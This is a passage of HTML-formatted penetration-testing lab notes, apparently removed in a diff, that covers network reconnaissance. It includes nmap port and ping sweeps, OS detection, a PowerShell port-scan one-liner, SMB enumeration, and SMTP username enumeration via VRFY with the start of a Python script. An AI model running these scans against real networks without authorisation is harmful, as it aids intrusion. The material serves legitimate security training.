-&lt;span class="nv"&gt;@kali&lt;/span&gt;&lt;span class="p"&gt;:~$&lt;/span&gt; &lt;span class="n"&gt;sudo&lt;/span&gt; &lt;span class="n"&gt;iptables&lt;/span&gt; &lt;span class="n"&gt;-vn&lt;/span&gt; &lt;span class="n"&gt;-L&lt;/span&gt;
-
-&lt;span class="nv"&gt;@kali&lt;/span&gt;&lt;span class="p"&gt;:~$&lt;/span&gt; &lt;span class="n"&gt;sudo&lt;/span&gt; &lt;span class="n"&gt;iptables&lt;/span&gt; &lt;span class="n"&gt;-Z&lt;/span&gt;
-
-&lt;span class="nv"&gt;@kali&lt;/span&gt;&lt;span class="p"&gt;:~$&lt;/span&gt; &lt;span class="n"&gt;nmap&lt;/span&gt; &lt;span class="n"&gt;-p&lt;/span&gt; &lt;span class="n"&gt;1&lt;/span&gt;&lt;span class="p"&gt;-&lt;/span&gt;&lt;span class="n"&gt;65535&lt;/span&gt; &lt;span class="n"&gt;192&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;168&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;50&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;149&lt;/span&gt;
-
-&lt;span class="nv"&gt;@kali&lt;/span&gt;&lt;span class="p"&gt;:~$&lt;/span&gt; &lt;span class="n"&gt;sudo&lt;/span&gt; &lt;span class="n"&gt;iptables&lt;/span&gt; &lt;span class="n"&gt;-vn&lt;/span&gt; &lt;span class="n"&gt;-L&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nv"&gt;@kali&lt;/span&gt;&lt;span class="p"&gt;:~$&lt;/span&gt; &lt;span class="n"&gt;sudo&lt;/span&gt; &lt;span class="n"&gt;nmap&lt;/span&gt; &lt;span class="n"&gt;-sS&lt;/span&gt; &lt;span class="n"&gt;192&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;168&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;50&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;149&lt;/span&gt;
-
-&lt;span class="nv"&gt;@kali&lt;/span&gt;&lt;span class="p"&gt;:~$&lt;/span&gt; &lt;span class="n"&gt;nmap&lt;/span&gt; &lt;span class="n"&gt;-sT&lt;/span&gt; &lt;span class="n"&gt;192&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;168&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;50&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;149&lt;/span&gt;
-
-&lt;span class="nv"&gt;@kali&lt;/span&gt;&lt;span class="p"&gt;:~$&lt;/span&gt; &lt;span class="n"&gt;sudo&lt;/span&gt; &lt;span class="n"&gt;nmap&lt;/span&gt; &lt;span class="n"&gt;-sU&lt;/span&gt; &lt;span class="n"&gt;192&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;168&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;50&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;149&lt;/span&gt;
-
-&lt;span class="nv"&gt;@kali&lt;/span&gt;&lt;span class="p"&gt;:~$&lt;/span&gt; &lt;span class="n"&gt;sudo&lt;/span&gt; &lt;span class="n"&gt;nmap&lt;/span&gt; &lt;span class="n"&gt;-sU&lt;/span&gt; &lt;span class="n"&gt;-sS&lt;/span&gt; &lt;span class="n"&gt;192&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;168&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;50&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;149&lt;/span&gt;
-
-&lt;span class="nv"&gt;@kali&lt;/span&gt;&lt;span class="p"&gt;:~$&lt;/span&gt; &lt;span class="n"&gt;nmap&lt;/span&gt; &lt;span class="n"&gt;-sn&lt;/span&gt; &lt;span class="n"&gt;192&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;168&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;50&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;1&lt;/span&gt;&lt;span class="p"&gt;-&lt;/span&gt;&lt;span class="n"&gt;253&lt;/span&gt;
-
-&lt;span class="nv"&gt;@kali&lt;/span&gt;&lt;span class="p"&gt;:~$&lt;/span&gt; &lt;span class="n"&gt;nmap&lt;/span&gt; &lt;span class="n"&gt;-v&lt;/span&gt; &lt;span class="n"&gt;-sn&lt;/span&gt; &lt;span class="n"&gt;192&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;168&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;50&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;1&lt;/span&gt;&lt;span class="p"&gt;-&lt;/span&gt;&lt;span class="n"&gt;253&lt;/span&gt; &lt;span class="n"&gt;-oG&lt;/span&gt; &lt;span class="nb"&gt;ping-sweep&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;txt&lt;/span&gt;
-
-&lt;span class="nv"&gt;@kali&lt;/span&gt;&lt;span class="p"&gt;:~$&lt;/span&gt; &lt;span class="n"&gt;grep&lt;/span&gt; &lt;span class="n"&gt;Up&lt;/span&gt; &lt;span class="nb"&gt;ping-sweep&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;txt&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="n"&gt;cut&lt;/span&gt; &lt;span class="n"&gt;-d&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot; &amp;quot;&lt;/span&gt; &lt;span class="o"&gt;-f&lt;/span&gt; &lt;span class="n"&gt;2&lt;/span&gt;
-
-&lt;span class="nv"&gt;@kali&lt;/span&gt;&lt;span class="p"&gt;:~$&lt;/span&gt; &lt;span class="n"&gt;nmap&lt;/span&gt; &lt;span class="n"&gt;-p&lt;/span&gt; &lt;span class="n"&gt;80&lt;/span&gt; &lt;span class="n"&gt;192&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;168&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;50&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;1&lt;/span&gt;&lt;span class="p"&gt;-&lt;/span&gt;&lt;span class="n"&gt;253&lt;/span&gt; &lt;span class="n"&gt;-oG&lt;/span&gt; &lt;span class="n"&gt;web-sweep&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;txt&lt;/span&gt;
-
-&lt;span class="nv"&gt;@kali&lt;/span&gt;&lt;span class="p"&gt;:~$&lt;/span&gt; &lt;span class="n"&gt;grep&lt;/span&gt; &lt;span class="n"&gt;open&lt;/span&gt; &lt;span class="n"&gt;web-sweep&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;txt&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="n"&gt;cut&lt;/span&gt; &lt;span class="n"&gt;-d&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot; &amp;quot;&lt;/span&gt; &lt;span class="n"&gt;-f2&lt;/span&gt;
-
-&lt;span class="nv"&gt;@kali&lt;/span&gt;&lt;span class="p"&gt;:~$&lt;/span&gt; &lt;span class="n"&gt;nmap&lt;/span&gt; &lt;span class="n"&gt;-sT&lt;/span&gt; &lt;span class="n"&gt;-A&lt;/span&gt; &lt;span class="p"&gt;-&lt;/span&gt;&lt;span class="n"&gt;-top-ports&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="n"&gt;20&lt;/span&gt; &lt;span class="n"&gt;192&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;168&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;50&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;1&lt;/span&gt;&lt;span class="p"&gt;-&lt;/span&gt;&lt;span class="n"&gt;253&lt;/span&gt; &lt;span class="n"&gt;-oG&lt;/span&gt; &lt;span class="n"&gt;top-port-sweep&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;txt&lt;/span&gt;
-
-&lt;span class="nv"&gt;@kali&lt;/span&gt;&lt;span class="p"&gt;:~$&lt;/span&gt; &lt;span class="nb"&gt;cat &lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;usr&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;share&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;nmap&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;nmap-services&lt;/span&gt;
-
-&lt;span class="nv"&gt;@kali&lt;/span&gt;&lt;span class="p"&gt;:~$&lt;/span&gt; &lt;span class="n"&gt;sudo&lt;/span&gt; &lt;span class="n"&gt;nmap&lt;/span&gt; &lt;span class="n"&gt;-O&lt;/span&gt; &lt;span class="n"&gt;192&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;168&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;50&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;14&lt;/span&gt; &lt;span class="p"&gt;-&lt;/span&gt;&lt;span class="n"&gt;-osscan-guess&lt;/span&gt;
-
-&lt;span class="nv"&gt;@kali&lt;/span&gt;&lt;span class="p"&gt;:~$&lt;/span&gt; &lt;span class="n"&gt;nmap&lt;/span&gt; &lt;span class="n"&gt;-sT&lt;/span&gt; &lt;span class="n"&gt;-A&lt;/span&gt; &lt;span class="n"&gt;192&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;168&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;50&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;14&lt;/span&gt;
-
-&lt;span class="nv"&gt;@kali&lt;/span&gt;&lt;span class="p"&gt;:~$&lt;/span&gt; &lt;span class="n"&gt;nmap&lt;/span&gt; &lt;span class="p"&gt;-&lt;/span&gt;&lt;span class="n"&gt;-script&lt;/span&gt; &lt;span class="n"&gt;http-headers&lt;/span&gt; &lt;span class="n"&gt;192&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;168&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;50&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;6&lt;/span&gt;
-
-&lt;span class="nv"&gt;@kali&lt;/span&gt;&lt;span class="p"&gt;:~$&lt;/span&gt; &lt;span class="n"&gt;nmap&lt;/span&gt; &lt;span class="p"&gt;-&lt;/span&gt;&lt;span class="n"&gt;-script-help&lt;/span&gt; &lt;span class="n"&gt;http-headers&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nb"&gt;PS &lt;/span&gt;&lt;span class="n"&gt;C&lt;/span&gt;&lt;span class="p"&gt;:\&lt;/span&gt;&lt;span class="n"&gt;Users&lt;/span&gt;&lt;span class="p"&gt;\&lt;/span&gt;&lt;span class="n"&gt;student&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt; &lt;span class="nb"&gt;Test-NetConnection&lt;/span&gt; &lt;span class="n"&gt;-Port&lt;/span&gt; &lt;span class="n"&gt;445&lt;/span&gt; &lt;span class="n"&gt;192&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;168&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;50&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;151&lt;/span&gt;
-&lt;span class="n"&gt;ComputerName&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;192&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;168&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;50&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;151&lt;/span&gt;
-&lt;span class="n"&gt;RemoteAddress&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;192&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;168&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;50&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;151&lt;/span&gt;
-&lt;span class="n"&gt;RemotePort&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;445&lt;/span&gt;
-&lt;span class="n"&gt;InterfaceAlias&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;Ethernet0&lt;/span&gt;
-&lt;span class="n"&gt;SourceAddress&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;192&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;168&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;50&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;152&lt;/span&gt;
-&lt;span class="n"&gt;TcpTestSucceeded&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;True&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nb"&gt;PS &lt;/span&gt;&lt;span class="n"&gt;C&lt;/span&gt;&lt;span class="p"&gt;:\&lt;/span&gt;&lt;span class="n"&gt;Users&lt;/span&gt;&lt;span class="p"&gt;\&lt;/span&gt;&lt;span class="n"&gt;student&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;1&lt;/span&gt;&lt;span class="p"&gt;..&lt;/span&gt;&lt;span class="n"&gt;1024&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;%&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nb"&gt;echo &lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="nb"&gt;New-Object&lt;/span&gt;
-&lt;span class="n"&gt;Net&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Sockets&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;TcpClient&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;Connect&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;192.168.50.151&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$_&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;TCP port $_ is open&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="n"&gt;2&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;&lt;span class="nv"&gt;$null&lt;/span&gt;
-&lt;span class="n"&gt;TCP&lt;/span&gt; &lt;span class="n"&gt;port&lt;/span&gt; &lt;span class="n"&gt;88&lt;/span&gt; &lt;span class="n"&gt;is&lt;/span&gt; &lt;span class="n"&gt;open&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-&lt;h3&gt;SMB Enumeration&lt;/h3&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nv"&gt;@kali&lt;/span&gt;&lt;span class="p"&gt;:~$&lt;/span&gt; &lt;span class="n"&gt;nmap&lt;/span&gt; &lt;span class="n"&gt;-v&lt;/span&gt; &lt;span class="n"&gt;-p&lt;/span&gt; &lt;span class="n"&gt;139&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;445&lt;/span&gt; &lt;span class="n"&gt;-oG&lt;/span&gt; &lt;span class="n"&gt;smb&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;txt&lt;/span&gt; &lt;span class="n"&gt;192&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;168&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;50&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;1&lt;/span&gt;&lt;span class="p"&gt;-&lt;/span&gt;&lt;span class="n"&gt;254&lt;/span&gt;
-
-&lt;span class="nv"&gt;@kali&lt;/span&gt;&lt;span class="p"&gt;:~$&lt;/span&gt; &lt;span class="nb"&gt;cat &lt;/span&gt;&lt;span class="n"&gt;smb&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;txt&lt;/span&gt;
-
-&lt;span class="nv"&gt;@kali&lt;/span&gt;&lt;span class="p"&gt;:~$&lt;/span&gt; &lt;span class="n"&gt;sudo&lt;/span&gt; &lt;span class="n"&gt;nbtscan&lt;/span&gt; &lt;span class="n"&gt;-r&lt;/span&gt; &lt;span class="n"&gt;192&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;168&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;50&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;0&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;24&lt;/span&gt;
-
-&lt;span class="nv"&gt;@kali&lt;/span&gt;&lt;span class="p"&gt;:~$&lt;/span&gt; &lt;span class="nb"&gt;ls &lt;/span&gt;&lt;span class="p"&gt;-&lt;/span&gt;&lt;span class="n"&gt;1&lt;/span&gt; &lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;usr&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;share&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;nmap&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;scripts&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;smb&lt;/span&gt;&lt;span class="p"&gt;*&lt;/span&gt;
-
-&lt;span class="nv"&gt;@kali&lt;/span&gt;&lt;span class="p"&gt;:~$&lt;/span&gt; &lt;span class="nb"&gt;ls &lt;/span&gt;&lt;span class="p"&gt;-&lt;/span&gt;&lt;span class="n"&gt;1&lt;/span&gt; &lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;usr&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;share&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;nmap&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;scripts&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;smb&lt;/span&gt;&lt;span class="p"&gt;*&lt;/span&gt;
-
-&lt;span class="nv"&gt;@kali&lt;/span&gt;&lt;span class="p"&gt;:~$&lt;/span&gt; &lt;span class="n"&gt;nmap&lt;/span&gt; &lt;span class="n"&gt;-v&lt;/span&gt; &lt;span class="n"&gt;-p&lt;/span&gt; &lt;span class="n"&gt;139&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;445&lt;/span&gt; &lt;span class="p"&gt;-&lt;/span&gt;&lt;span class="n"&gt;-script&lt;/span&gt; &lt;span class="n"&gt;smb-os-discovery&lt;/span&gt; &lt;span class="n"&gt;192&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;168&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;50&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;152&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;C&lt;/span&gt;&lt;span class="p"&gt;:\&lt;/span&gt;&lt;span class="n"&gt;Users&lt;/span&gt;&lt;span class="p"&gt;\&lt;/span&gt;&lt;span class="n"&gt;student&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;net&lt;/span&gt; &lt;span class="n"&gt;view&lt;/span&gt; &lt;span class="p"&gt;\\&lt;/span&gt;&lt;span class="n"&gt;dc01&lt;/span&gt; &lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;all&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-&lt;h3&gt;SMTP Enumeration&lt;/h3&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nv"&gt;@kali&lt;/span&gt;&lt;span class="p"&gt;:~$&lt;/span&gt; &lt;span class="n"&gt;nc&lt;/span&gt; &lt;span class="n"&gt;-nv&lt;/span&gt; &lt;span class="n"&gt;192&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;168&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;50&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;8&lt;/span&gt; &lt;span class="n"&gt;25&lt;/span&gt;
-&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;UNKNOWN&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;192&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;168&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;50&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;8&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="n"&gt;25&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;smtp&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;open&lt;/span&gt;
-&lt;span class="n"&gt;220&lt;/span&gt; &lt;span class="n"&gt;mail&lt;/span&gt; &lt;span class="n"&gt;ESMTP&lt;/span&gt; &lt;span class="n"&gt;Postfix&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Ubuntu&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-&lt;span class="n"&gt;VRFY&lt;/span&gt; &lt;span class="n"&gt;root&lt;/span&gt;
-&lt;span class="n"&gt;252&lt;/span&gt; &lt;span class="n"&gt;2&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;0&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;0&lt;/span&gt; &lt;span class="n"&gt;root&lt;/span&gt;
-&lt;span class="n"&gt;VRFY&lt;/span&gt; &lt;span class="n"&gt;idontexist&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="ch"&gt;#!/usr/bin/python&lt;/span&gt;
-&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;socket&lt;/span&gt;
-&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;sys&lt;/span&gt;
-&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
-&lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Usage: vrfy.py &amp;lt;username&amp;gt; &amp;lt;target_ip&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-&lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-&lt;span class="c1"&gt;# Create a Socket&lt;/span&gt;
-&lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;AF_INET&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SOCK_STREAM&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-&lt;span class="c1"&gt;# Connect to the Server&lt;/span&gt;
-&lt;span class="n"&gt;ip&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
-&lt;span class="n"&gt;connect&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;connect&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;ip&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;25&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
-&lt;span class="c1"&gt;# Receive the banner&lt;/span&gt;
-&lt;span class="n"&gt;banner&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recv&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1024&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-&lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;banner&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-&lt;span class="c1"&gt;# VRFY a user&lt;/span&gt;
-&lt;span class="n"&gt;user&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;encode&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
